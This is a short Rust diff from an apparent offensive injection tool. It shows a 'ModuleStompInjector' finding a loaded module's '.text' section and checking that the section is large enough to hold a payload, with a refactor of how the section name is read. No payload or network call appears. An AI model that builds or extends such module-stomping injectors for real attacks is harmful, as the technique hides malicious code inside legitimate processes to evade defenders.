@@ -89,7 +89,9 @@ impl Injector for ModuleStompInjector {
                             for i in 0..ns {
                                 let sec = (sec_base + i * std::mem::size_of::<winapi::um::winnt::IMAGE_SECTION_HEADER>())
                                     as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
-                                if &(*sec).Name[..5] == b".text" {
+                                let name = std::ptr::addr_of!((*sec).Name);
+                                let name_bytes = &*(name as *const [u8; 8]);
+                                if &name_bytes[..5] == b".text" {
                                     return *(*sec).Misc.VirtualSize() as usize >= payload.len();
                                 }
                             }
